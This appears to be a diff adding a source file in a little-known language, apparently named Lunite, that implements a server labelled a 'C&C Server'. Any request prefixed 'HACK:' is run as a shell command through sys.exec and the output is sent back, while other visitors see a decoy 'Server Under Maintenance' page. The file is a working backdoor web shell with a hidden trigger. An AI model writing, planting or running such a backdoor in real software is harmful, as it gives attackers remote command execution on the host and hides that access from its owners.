@@ -1,0 +1,52 @@
+import "std/net.lun" as net
+import "std/sys.lun" as sys
+import "std/string.lun" as str
+import "std/io.lun" as io
+
+fn handle_client(s: net.Stream) {
+    let req = net.read(s);
+    print("Received raw request.");
+    
+    let len = str.length(req);
+    let is_hack = 0;
+    if (len > 5) {
+        let prefix = str.sub(req, 0, 5);
+        if (prefix == "HACK:") {
+            is_hack = 1;
+        }
+    }
+    
+    if (is_hack == 1) {
+        print("HACK DETECTED!");
+        let cmd = str.sub(req, 5, len);
+        print("Executing command...");
+        
+        // Execute and redirect output to temp file
+        let full_cmd = str.concat(cmd, " > out.txt 2>&1");
+        sys.exec(full_cmd);
+        
+        // Read result
+        let output = io.read_file("out.txt");
+        
+        let header = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n";
+        let resp = str.concat(header, output);
+        net.write(s, resp);
+    } else {
+        print("Normal request.");
+        let resp = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 24\r\n\r\nServer Under Maintenance";
+        net.write(s, resp);
+    }
+    
+    net.close(s);
+    print("Session done.");
+}
+
+fn main() {
+    print("Starting Lunite C&C Server on port 8080...");
+    let listener = net.bind(8080);
+    
+    while (1 == 1) {
+        let client = net.accept(listener);
+        spawn handle_client(client);
+    }
+}
